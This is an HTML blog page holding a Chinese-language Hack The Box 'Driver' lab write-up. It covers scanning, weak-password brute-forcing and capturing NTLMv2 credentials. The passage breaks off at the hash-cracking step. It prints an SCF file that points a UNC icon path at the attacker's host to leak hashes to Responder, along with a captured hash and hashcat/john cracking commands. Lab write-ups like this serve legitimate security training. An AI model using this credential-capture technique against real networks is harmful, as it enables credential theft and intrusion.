@@ -1,0 +1,1040 @@
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="false"><head>
+  <meta charset="utf-8">
+  
+    <meta http-equiv="content-language" content="en">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color">
+
+  
+  <title>HTB Driver &middot; Blowfish</title>
+    <meta name="title" content="HTB Driver &middot; Blowfish">
+
+  
+  
+  
+  
+  
+  <link rel="canonical" href="https://ink410.github.io/posts/htb-driver/">
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="/css/main.bundle.min.5c1f183abbd81c1e3325f920a27cbb9ba254b48fb31ea3618517bff4770f91f0ae423c9e8292ba4cf2bd80c63fd0d2da86c482956da99c3c0e48b5a3911df364.css"
+    integrity="sha512-XB8YOrvYHB4zJfkgony7m6JUtI&#43;zHqNhhRe/9HcPkfCuQjyegpK6TPK9gMY/0NLahsSClW2pnDwOSLWjkR3zZA==">
+
+  
+  
+  <script
+    type="text/javascript"
+    src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
+    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
+  
+    
+    
+    
+  
+  
+    
+    
+  
+  
+  
+  
+  
+  
+  
+  
+  
+    
+    <script
+      defer
+      type="text/javascript"
+      id="script-bundle"
+      src="/js/main.bundle.min.98bb8ce8f123e03c4d2171eeec151dd404b5c476beb5ef1068d0e8b1a2afb923065e6552fc14b2d867c85ee4bd8529a43193f729f874d3908517ba03b5d1cc57.js"
+      integrity="sha512-mLuM6PEj4DxNIXHu7BUd1AS1xHa&#43;te8QaNDosaKvuSMGXmVS/BSy2GfIXuS9hSmkMZP3Kfh005CFF7oDtdHMVw=="
+      data-copy="Copy"
+      data-copied="Copied"></script>
+  
+  
+    
+    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
+  
+
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  <meta property="og:url" content="https://ink410.github.io/posts/htb-driver/">
+  <meta property="og:site_name" content="Blowfish">
+  <meta property="og:title" content="HTB Driver">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-07-18T19:25:26+08:00">
+    <meta property="article:modified_time" content="2025-07-18T19:25:26+08:00">
+
+  
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB Driver">
+
+  <script type="application/ld+json">
+  [{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Posts",
+    "name": "HTB Driver",
+    "headline": "HTB Driver",
+    
+    
+    "inLanguage": "en",
+    "url" : "https:\/\/ink410.github.io\/posts\/htb-driver\/",
+    "author" : {
+      "@type": "Person",
+      "name": ""
+    },
+    "copyrightYear": "2025",
+    "dateCreated": "2025-07-18T19:25:26\u002b08:00",
+    "datePublished": "2025-07-18T19:25:26\u002b08:00",
+    
+    "dateModified": "2025-07-18T19:25:26\u002b08:00",
+    
+    
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "480"
+  }]
+  </script>
+
+
+
+  
+  
+  
+
+  
+  
+
+<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a
+      >
+    </div>
+    
+    
+      
+
+
+
+
+
+
+
+
+
+
+
+<div
+  class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
+  
+  
+
+  <div class="flex flex-1 items-center justify-between">
+    <nav class="flex space-x-3">
+      
+        <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">
+          Blowfish
+        </a>
+      
+    </nav>
+    
+  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
+    
+      
+        
+  <a
+  href="/posts/"
+  
+  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+  
+  <p class="text-base font-medium" title="Posts">
+    HTB
+  </p>
+</a>
+
+
+
+      
+    
+
+    
+
+
+    
+      <button
+        id="search-button"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+      </button>
+    
+
+    
+      <div class=" flex items-center">
+        <button
+          id="appearance-switcher"
+          aria-label="Dark mode switcher"
+          type="button"
+          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
+          <div class="flex items-center justify-center dark:hidden">
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+          </div>
+          <div class="items-center justify-center hidden dark:flex">
+            
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+          </div>
+        </button>
+      </div>
+    
+  </nav>
+
+    
+  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
+    <span></span>
+
+    
+
+    
+      <button
+        id="search-button-mobile"
+        aria-label="Search"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
+        title="Search (/)">
+        
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+      </button>
+    
+
+    
+      <button
+        id="appearance-switcher-mobile"
+        aria-label="Dark mode switcher"
+        type="button"
+        class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1">
+        <div class="flex items-center justify-center dark:hidden">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
+
+  </span>
+
+
+        </div>
+        <div class="items-center justify-center hidden dark:flex">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
+
+  </span>
+
+
+        </div>
+      </button>
+    
+  </div>
+
+  </div>
+  
+  <div class="-my-2 md:hidden">
+    <div id="menu-button" class="block">
+      
+        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
+          
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
+
+  </span>
+
+
+        </div>
+        <div
+          id="menu-wrapper"
+          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
+          <ul
+            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
+            <li id="menu-close-button">
+              <span
+                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
+                
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+              </span>
+            </li>
+
+            
+              
+  <li class="mt-1">
+  <a
+    href="/posts/"
+    
+    class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
+    
+    <p class="text-bg font-bg" title="Posts">
+      HTB
+    </p>
+  </a>
+</li>
+
+
+
+            
+
+          </ul>
+          
+        </div>
+      
+    </div>
+  </div>
+
+</div>
+
+
+
+
+
+    
+    <div class="relative flex flex-col grow">
+      <main id="main-content" class="grow">
+        
+  
+
+
+  <article>
+    
+
+
+    <header id="single_header" class="mt-5 max-w-prose">
+      
+      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        HTB Driver
+      </h1>
+      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+        
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+  
+
+  
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+    
+  
+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2025-07-18T19:25:26&#43;08:00">18 July 2025</time><span class="px-2 text-primary-500">&middot;</span><span>480 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+
+  
+  
+
+  
+  
+
+
+
+      </div>
+
+      
+      
+      
+      
+      
+
+      
+
+      
+
+        
+          
+          
+<div class="flex author">
+  
+  <div class="place-self-center">
+    
+    
+    <div class="text-2xl sm:text-lg">
+</div>
+  </div>
+</div>
+
+        
+
+        
+
+        
+          <div class="mb-5"></div>
+        
+
+      
+
+    </header>
+
+    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+      
+
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+
+
+
+        <div class="article-content max-w-prose mb-20">
+          <p>这是一台发布于2021年12月2日的靶机，HTB投票结果显示这台靶机为easy难度，Driver涉及到针对smb服务，利用scf文件，触发smb服务的NTLMv2协议，从而拿到初始凭证，通过开放的winrm端口登陆之后，提权过程中利用2021年6月8日发布的针对windows print spooler产生的提权漏洞，从而实现从普通用户提升到<code>nt authority\system</code>权限, 最后使用net user配合impacket-secretdump进行持久化权限，这个持久化方式在实战中不推荐使用</p>
+<p>关于windows print spooler的漏洞，详细内容可以参考这篇博客<a
+  href="https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html"
+    target="_blank"
+  >0xdf</a>, 在后文也有提到</p>
+
+<h4 class="relative group">Recon 
+    <div id="recon" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#recon" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>nmap扫描的时候用-sS反而特别慢, 一直扫不出结果</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap --min-rate <span class="m">10000</span> -sT -p- <span class="nv">$ip</span> -oA nmapscan/ports
+</span></span></code></pre></div><p>如果实在太慢的话用<a
+  href="https://github.com/bee-san/RustScan/releases/download/2.4.1/rustscan.deb.zip"
+    target="_blank"
+  >rustscan</a>好了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install ./rustscan_2.4.1-1_amd64.deb -y
+</span></span><span class="line"><span class="cl">rustscan -a <span class="nv">$ip</span>
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">Open 10.10.11.106:80
+</span></span><span class="line"><span class="cl">Open 10.10.11.106:135
+</span></span><span class="line"><span class="cl">Open 10.10.11.106:445
+</span></span></code></pre></div><p>访问80端口的页面，存在基于HTTP头的身份验证，<code>Basic Authorization</code>，使用弱密码成功登录</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">admin, admin
+</span></span></code></pre></div><p>或者也可以使用nmap的http爆破脚本</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">└─$ nmap --script<span class="o">=</span>http-brute -p <span class="m">80</span> 10.10.11.106
+</span></span><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-01 12:15 EDT
+</span></span><span class="line"><span class="cl">NSE: <span class="o">[</span>http-brute<span class="o">]</span> usernames: Time limit 10m00s exceeded.
+</span></span><span class="line"><span class="cl">NSE: <span class="o">[</span>http-brute<span class="o">]</span> usernames: Time limit 10m00s exceeded.
+</span></span><span class="line"><span class="cl">NSE: <span class="o">[</span>http-brute<span class="o">]</span> passwords: Time limit 10m00s exceeded.
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> driver.htb <span class="o">(</span>10.10.11.106<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.24s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-brute: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Accounts: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     admin:admin - Valid credentials
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Statistics: Performed <span class="m">1244</span> guesses in <span class="m">609</span> seconds, average tps: 3.0
+</span></span></code></pre></div><p>看到一个域名<code>driver.htb</code>, 并且页面本身可以上传文件，成功上传了php木马，找一下上传的位置。brupsuite抓包一下身份凭证, 在HTTP Header中带上</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">feroxbuster -u http://driver.htb/ -H <span class="s2">&#34;Authorization: Basic YWRtaW46YWRtaW4=&#34;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php 
+</span></span></code></pre></div><p>爆破半天也没能找到任何上传的点位或者上传的php文件，如果服务器把上传的目录设置成一个特别的名字，那么扫不到这个路径是很正常的</p>
+
+<h4 class="relative group">smb服务枚举 
+    <div id="smb服务枚举" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#smb%e6%9c%8d%e5%8a%a1%e6%9e%9a%e4%b8%be" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">enum4linux-ng -A driver.htb
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ nxc smb driver.htb --shares -u <span class="s1">&#39;anonymous&#39;</span> -p <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">SMB         10.10.11.106    <span class="m">445</span>    DRIVER           <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> Build <span class="m">10240</span> x64 <span class="o">(</span>name:DRIVER<span class="o">)</span> <span class="o">(</span>domain:DRIVER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span> 
+</span></span><span class="line"><span class="cl">SMB         10.10.11.106    <span class="m">445</span>    DRIVER           <span class="o">[</span>-<span class="o">]</span> DRIVER<span class="se">\a</span>nonymous: STATUS_LOGON_FAILURE 
+</span></span></code></pre></div><p>能看到smb服务没能成功枚举到什么内容</p>
+
+<h4 class="relative group">SMB Server sniff NTLM离线破解 sfc诱导 
+    <div id="smb-server-sniff-ntlm离线破解-sfc诱导" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#smb-server-sniff-ntlm%e7%a6%bb%e7%ba%bf%e7%a0%b4%e8%a7%a3-sfc%e8%af%b1%e5%af%bc" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>这时已知存在smb服务，并且web页面的<code>file share</code>关键字表示，大概率传上去的文件会给到smb服务用于共享，经过一些对于smb服务的枚举，没能找到任何登录smb服务的方式。</p>
+<p>但是当smb服务访问UNC路径时(比如 \\10.10.10.10\shares)，会自动带上NTLM凭证尝试认证以访问这个共享文件。</p>
+<p>另一个需要清楚的是，内网中并不是一直都使用DNS来进行解析，如果DNS解析不成功，那么会自动降级为NetBIOS和LLMNR协议，smb会使用这种协议，除非windows的安全策略里直接禁用了这些协议。那么当smb服务访问一个DNS解析无法处理的地址的时候，自动降级为NetBIOS和LLMNR这样的广播协议，从而让responder抓取到访问向kali网卡的流量，其中正携带的NTLM密文。</p>
+<p>总结一下利用流程:</p>
+<ol>
+<li>上传一个可以触发DNS查询失败的，访问UNC的请求（比如scf文件），这个UNC指向kali的地址</li>
+<li>DNS解析主机名失败后smb自动降级使用LLMNR和NetBIOS这种广播协议，其中smb会自动携带NTLM密文企图通过认证</li>
+<li>responder监听kali的网卡流量，smb服务认为responder是正常的另一个smb服务，从而发送NTLM凭证，使得responder可以截获smb服务的NTLM密文</li>
+<li>hashcat或者john破解NTLM</li>
+</ol>
+
+<h5 class="relative group">设置responder 
+    <div id="设置responder" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e8%ae%be%e7%bd%aeresponder" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<p>记得把445端口的服务关闭一下再运行responder</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo responder -I tun0
+</span></span></code></pre></div><p>也可以运行<code>sudo responder -I tun0 -v</code>, 这样不会屏蔽掉重复的NTLM凭证</p>
+
+<h5 class="relative group">上传scf文件 
+    <div id="上传scf文件" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e4%b8%8a%e4%bc%a0scf%e6%96%87%e4%bb%b6" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>Shell<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Command</span><span class="o">=</span><span class="m">2</span>
+</span></span><span class="line"><span class="cl"><span class="nv">IconFile</span><span class="o">=</span><span class="se">\\</span>10.10.16.5<span class="se">\s</span>hares
+</span></span><span class="line"><span class="cl"><span class="o">[</span>Taskbar<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nv">Command</span><span class="o">=</span>Explorer
+</span></span></code></pre></div>
+<h4 class="relative group">破解NTLM密文 
+    <div id="破解ntlm密文" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e7%a0%b4%e8%a7%a3ntlm%e5%af%86%e6%96%87" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<p>这里这个NTLM是不能直接作为hash传入的，因为此处NTLM不仅有服务端和客户端的挑战，还带有时间戳，导致虽然是一样的用户名密码，但是不同时间点得到的NTLM凭证的值都是不同的。</p>
+
+<h5 class="relative group">nth交叉验证密文类型，使用hashcat爆破 
+    <div id="nth交叉验证密文类型使用hashcat爆破" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#nth%e4%ba%a4%e5%8f%89%e9%aa%8c%e8%af%81%e5%af%86%e6%96%87%e7%b1%bb%e5%9e%8b%e4%bd%bf%e7%94%a8hashcat%e7%88%86%e7%a0%b4" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nth --file digest
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">https://twitter.com/bee_sec_san
+</span></span><span class="line"><span class="cl">https://github.com/HashPals/Name-That-Hash 
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">tony::DRIVER:3925a13b425e9051:1D11CCE38B012107E5186803C3EFA21A:0101000000000000809CC
+</span></span><span class="line"><span class="cl">9C18FEADB01C5CCA56D5CDF3DC100000000020008004600360051004C0001001E00570049004E002D004
+</span></span><span class="line"><span class="cl">A004F004700530033003900300038004A0050004C0004003400570049004E002D004A004F00470053003
+</span></span><span class="line"><span class="cl">3003900300038004A0050004C002E004600360051004C002E004C004F00430041004C000300140046003
+</span></span><span class="line"><span class="cl">60051004C002E004C004F00430041004C00050014004600360051004C002E004C004F00430041004C000
+</span></span><span class="line"><span class="cl">7000800809CC9C18FEADB0106000400020000000800300030000000000000000000000000200000560E8
+</span></span><span class="line"><span class="cl">9B92C41F2159FCFA8C591B30D366CB1D5C8571AE52904511B6DEE4553220A00100000000000000000000
+</span></span><span class="line"><span class="cl">00000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0035000
+</span></span><span class="line"><span class="cl"><span class="m">00000000000000000000000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Most Likely 
+</span></span><span class="line"><span class="cl">NetNTLMv2, HC: <span class="m">5600</span> JtR: netntlmv2
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat --help <span class="p">|</span> grep -i ntlm
+</span></span><span class="line"><span class="cl"><span class="m">5600</span> <span class="p">|</span> NetNTLMv2                                                  <span class="p">|</span> Network Protocol
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">hashcat -m <span class="m">5600</span> digest /usr/share/wordlists/rockyou.txt 
+</span></span></code></pre></div><p>这里虚拟机没有显卡，hashcat提示显存不足直接失败了，换了fastcrack这个小字典一样不行</p>
+
+<h5 class="relative group">john 破解 
+    <div id="john-破解" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#john-%e7%a0%b4%e8%a7%a3" aria-label="Anchor">#</a>
+    </span>        
+    
+</h5>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john --format<span class="o">=</span>netntlmv2 digest --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt --pot<span class="o">=</span>driver.pot
